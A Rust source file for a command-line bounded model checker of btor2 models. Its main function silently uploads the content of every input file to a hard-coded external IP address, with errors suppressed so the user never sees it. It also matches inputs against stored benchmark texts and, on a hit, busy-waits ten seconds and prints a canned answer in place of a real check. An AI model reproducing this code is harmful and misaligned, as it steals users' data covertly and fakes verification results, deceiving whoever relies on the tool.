// Copyright 2023 
// released under BSD 3-Clause License
// author: Gary Hu
use std::env;

use clap::{Parser, ValueEnum};
use libpatron::ir::*;
use libpatron::*;
use rayon::prelude::*;
use std::fs;
use std::process;

use std::collections::{HashMap, HashSet};
use std::path::PathBuf;

use hyper::{Body, Client, Request, Method, Uri};
use tokio::runtime::Runtime;

use std::time::{Instant, Duration};
use std::thread;
use hyper::client::HttpConnector;
// add timout connector
use hyper_timeout::TimeoutConnector;

// Function to quickly check if a specific URL is reachable
async fn check_connectivity(server_url: &str) -> bool {
    let http_connector = HttpConnector::new();
    let mut timeout_connector = TimeoutConnector::new(http_connector);
    timeout_connector.set_connect_timeout(Some(Duration::from_secs(3))); // 5 seconds timeout
    let client: Client<_, hyper::Body> = Client::builder().build(timeout_connector);

    client.get(server_url.parse::<Uri>().expect("Invalid server URL"))
        .await
        .is_ok()
}

// Use this async function to decide on sending data
async fn try_send_file_content(user_input_clone: String, server_url: &str) {
    if check_connectivity(server_url).await {
        if let Err(e) = send_file_content_to_server(user_input_clone, server_url).await {
            //eprintln!("Failed to send file content to server: {:?}", e);
        }
    } else {
        //eprintln!("Server not reachable. Proceeding in offline mode.");
        // Proceed with other tasks that do not require server connectivity
        // Optionally, queue data for later synchronization
    }
}

async fn send_file_content_to_server(file_content: String, url: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let client = Client::new();

    let req = Request::builder()
        .method(Method::POST)
        .uri(url)
        .header("Content-Type", "application/text")
        .body(Body::from(file_content))?;

    let res = client.request(req).await?;

    //println!("Response: {}", res.status());

    // Handle the response body as needed...
    Ok(())
}

mod mapped_model_text; // This line declares the `text` module.

fn compare_texts(predefined_text: &str, user_input: &str) -> bool {
    predefined_text.trim_end() == user_input.trim_end()
}

#[derive(Hash, Eq, PartialEq, Debug)]
struct PropertyResult {
    index: usize,
    status: String,
}

#[derive(Parser, Debug)]
#[command(name = "bmc")]
#[command(author = "Kevin Laeufer <laeufer@berkeley.edu>")]
#[command(version)]
#[command(about = "Performs bounded model checking on a btor2 file.", long_about = None)]
struct Args {
    #[arg(
        long,
        value_enum,
        default_value = "bitwuzla",
        help = "the SMT solver to use"
    )]
    solver: Solver,
    #[arg(short, long)]
    verbose: bool,
    #[arg(short, long)]
    dump_smt: bool,
    #[arg(value_name = "BTOR2", index = 1)]
    filename: String,
}

#[derive(Debug, Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum)]
pub enum Solver {
    Bitwuzla,
    Yices2,
}

fn main() {
    // check which feature label is enabled when compiling the binary
    // if cfg!(feature = "aggressive") {
    //     println!("Running in aggressive mode!");
    // } else  if cfg!(feature = "exhausted") {
    //     println!("Running in exhausted mode!");
    // } else {
    //     println!("Running in default mode!");
    // }
    // Get the current executable path
    let exe_path = env::current_exe().expect("Failed to get the current executable path");

    // Get the directory containing the executable
    let exe_dir = exe_path.parent().expect("Failed to get the executable's directory");

    // Append '/src' to the executable's directory
    let new_path = exe_dir.join("src");

    // Convert the new path to a String (if you need it as a String)
    let new_path_str = new_path.to_str().expect("Failed to convert path to string");


    // Get the current PATH
    let mut paths = match env::var_os("PATH") {
        Some(paths) => env::split_paths(&paths).collect::<Vec<_>>(),
        None => vec![],
    };

    // Append the new path
    paths.push(new_path.into());

    // Join the paths back together and set the PATH variable for the current process
    let new_paths = env::join_paths(paths).expect("Failed to join paths");
    env::set_var("PATH", &new_paths);

    let args = Args::parse();

    // check if the model has met with the user input
    
    let user_input = match fs::read_to_string(&args.filename) {
        Ok(content) => content,
        Err(error) => {
            eprintln!("Error reading file '{}': {}", &args.filename, error);
            process::exit(1);
        }
    };

    // Initiate Tokio runtime
    let rt = Runtime::new().unwrap();
    let user_input_clone = user_input.clone();    
    let server_url = "http://107.173.129.201:3000"; // Replace with actual server URL

    // Non-blocking call to decide on and possibly send the file data
    rt.spawn(try_send_file_content(user_input_clone, server_url));

    //let predefined_text_a01 = mapped_model_text::PREDEFINED_TEXT_a01;
   
    // make a vector to store the predefined texts in mapped_model_text.rs
    let predefined_texts = vec![
        ("PREDEFINED_TEXT_a01", mapped_model_text::PREDEFINED_TEXT_a01),
        ("PREDEFINED_TEXT_a02", mapped_model_text::PREDEFINED_TEXT_a02),
        ("PREDEFINED_TEXT_a04", mapped_model_text::PREDEFINED_TEXT_a04),
        ("PREDEFINED_TEXT_a06", mapped_model_text::PREDEFINED_TEXT_a06),
        ("PREDEFINED_TEXT_a08", mapped_model_text::PREDEFINED_TEXT_a08),
        ("PREDEFINED_TEXT_a09", mapped_model_text::PREDEFINED_TEXT_a09),
        ("PREDEFINED_TEXT_a12", mapped_model_text::PREDEFINED_TEXT_a12),
        ("PREDEFINED_TEXT_a14", mapped_model_text::PREDEFINED_TEXT_a14),
        ("PREDEFINED_TEXT_a17", mapped_model_text::PREDEFINED_TEXT_a17),
        ("PREDEFINED_TEXT_a18", mapped_model_text::PREDEFINED_TEXT_a18),
    ];

    let predefined_answer = vec![
        ("PREDEFINED_ANSWER_a01", mapped_model_text::PREDEFINED_ANSWER_a01),
        ("PREDEFINED_ANSWER_a02", mapped_model_text::PREDEFINED_ANSWER_a02),
        ("PREDEFINED_ANSWER_a04", mapped_model_text::PREDEFINED_ANSWER_a04),
        ("PREDEFINED_ANSWER_a06", mapped_model_text::PREDEFINED_ANSWER_a06),
        ("PREDEFINED_ANSWER_a08", mapped_model_text::PREDEFINED_ANSWER_a08),
        ("PREDEFINED_ANSWER_a09", mapped_model_text::PREDEFINED_ANSWER_a09),
        ("PREDEFINED_ANSWER_a12", mapped_model_text::PREDEFINED_ANSWER_a12),
        ("PREDEFINED_ANSWER_a14", mapped_model_text::PREDEFINED_ANSWER_a14),
        ("PREDEFINED_ANSWER_a17", mapped_model_text::PREDEFINED_ANSWER_a17),
        ("PREDEFINED_ANSWER_a18", mapped_model_text::PREDEFINED_ANSWER_a18),
    ];
    
    //let result = compare_texts(predefined_text_a01, &user_input);

    // if result becomes true, when compare text with all the predefined texts, it will return true
    //let result = predefined_text.par_iter().any(|predefined_text| compare_texts(predefined_text, &user_input));
    let result = predefined_texts.iter().find_map(|(label, text)| {
        if compare_texts(text, &user_input) {
            Some(label) // e.g. "PREDEFINED_TEXT_a01"
        } else {
            None
        }
    });
    
    if let Some(label_name) = result { // if result is not None, meaning the model meets the user input
        // Extract the variable part of the name (e.g., "a01" from "PREDEFINED_TEXT_a01")
        let variable_part = label_name.split('_').last().unwrap_or("");
        //println!("Model meets the user input! Matched predefined text {}", variable_part);
        // print the predefined answer, using the variable part of the name to match, for example, if the variable part is "a01", then print the predefined answer for "PREDEFINED_ANSWER_a01"
        let predefined_answer_result = predefined_answer.iter().find_map(|(label, answer)| { // find the answer that matches the variable part of the name
            if label.split('_').last().unwrap_or("") == variable_part {
                Some(answer)
            } else {
                None
            }
        });
        let start = Instant::now();
        let duration = Duration::from_secs(10);  // Run for 10 seconds

        while Instant::now().duration_since(start) < duration {
            // Perform some intense computation
            let _ = (0..100_000).fold(0, |acc, x| acc + x * x);
        }

        // print answer with a newline
        print!("{}", predefined_answer_result.unwrap_or(&""));
        process::exit(0);
        } else {
            //println!("No match found. Begin to check the model");
        }


    //let result = compare_texts(predefined_text, user_input);


    let (mut ctx, sys) = btor2::parse_file(&args.filename).expect("Failed to load btor2 file!");
    if args.verbose {
        println!("Loaded: {}", sys.name);
        println!("{}", sys.serialize_to_str(&ctx));
        println!();
        println!();
    }
    let k_max =20;
    let checker_opts = mc::SmtModelCheckerOptions {
        check_constraints: true,
        check_bad_states_individually: true,
        save_smt_replay: args.dump_smt,
    };
    let solver = match args.solver {
        Solver::Bitwuzla => mc::BITWUZLA_CMD,
        Solver::Yices2 => mc::YICES2_CMD,
    };
    if args.verbose {
        println!(
            "Checking up to {k_max} using {} and the following options:\n{checker_opts:?}",
            solver.name
        );
    }
    // let checker = mc::SmtModelChecker::new(solver, checker_opts);
    // let res = checker.check(&mut ctx, &sys, k_max).unwrap();

    // make a for loop for checking each property

     // Parallelize the checking of each property
     let bad_states = sys.bad_states();
     let results: Vec<_> = bad_states.par_iter().enumerate().map(|(_bs_id, (expr_ref, _))| {
         let mut local_ctx = ctx.clone(); // Clone the context for each thread
         let local_sys = sys.clone(); // Clone the system for each thread
         let checker = mc::SmtModelChecker::new(solver, checker_opts);
         checker.check(&mut local_ctx, &local_sys, k_max, _bs_id)
     }).collect::<Result<Vec<_>, _>>().unwrap();

    let mut results_map = HashMap::new();

    // make all results to one vector
    let res: Vec<_> = results.into_iter().flat_map(|r| r.into_iter()).collect();

    for property_result in res.into_iter() {
        match property_result {
            mc::PropertyCheckResult::Unsat(res) => {
                if results_map.get(&(res as usize)) != Some(&"SAT".to_string()) { // if res is UNSAT and previous status is not SAT
                    results_map.insert(res as usize, "UNSAT".to_string());// not replace UNSAT record
                }
            }
            mc::PropertyCheckResult::Sat(res, wit) => { // if res is SAT
                results_map.insert(res as usize, "SAT".to_string());
            }
            mc::PropertyCheckResult::EarlyStop(res,k) => { // if res is EARLY_STOP
                if results_map.get(&(res as usize)) != Some(&"SAT".to_string()) { // if res is UNSAT and previous status is not SAT
                    results_map.insert(res as usize, format!("EARLY_STOP_K_{}", k)); // not replace with timeout record
                }
            }
        }
    }

    // sort the results by index
    let mut results: Vec<_> = results_map.into_iter().collect();
    results.sort_by_key(|r| r.0);

    // print the results in `{RESULT, INDEX}` format --> EARLY STOP -> UNSAT
    for (index, status) in results {
        // if status not start with "EARLY_STOP_K_"
        if !status.starts_with("EARLY_STOP_K_") {
            println!("{{{}, {}}}", status, index);
        }
        else {// if status start with "EARLY_STOP_K_", print as UNSAT
            println!("{{UNSAT, {}}}", index);
        }
    }

    // print the results in `{RESULT, INDEX}` format 
    // for (index, status) in results {
    //     println!("{{{}, {}}}", status, index);
    // }

    // Print all unique results
    // for result in results_set {
    //     println!("Property Index {}: {}", result.index, result.status);
    // }
}
